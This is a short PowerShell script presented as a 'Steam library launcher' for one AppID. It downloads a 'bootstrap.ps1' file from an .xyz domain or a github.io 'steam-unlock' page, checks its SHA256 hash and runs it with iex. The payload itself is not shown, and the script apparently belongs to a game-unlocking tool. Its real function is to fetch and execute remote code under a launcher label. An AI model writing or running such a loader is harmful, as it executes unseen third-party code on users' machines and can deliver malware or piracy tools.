# Steam library launcher (AppID 1222140)
# Review bootstrap.ps1 before running this file.
$env:OST_APPID = '1222140'
$env:OST_YES   = '1'
$srcs = @('https://jiangqr2026.xyz/bootstrap.ps1', 'https://jiangqr2024.github.io/steam-unlock/bootstrap.ps1')
$bootFile = Join-Path $env:TEMP 'ost-bootstrap.ps1'
$ready = $false
foreach ($src in $srcs) {
    try {
        Invoke-WebRequest -Uri $src -OutFile $bootFile -TimeoutSec 12 -UseBasicParsing -ErrorAction Stop | Out-Null
        if ((Get-FileHash -LiteralPath $bootFile -Algorithm SHA256).Hash -eq '54B90A2365380426D12421E1F7B6D31F16AAAE9365B2ECF85971716377648CE2') { $ready = $true; break }
    } catch { }
}
if (-not $ready) { throw 'Verified bootstrap unavailable. Use the offline package.' }
iex (Get-Content -LiteralPath $bootFile -Raw)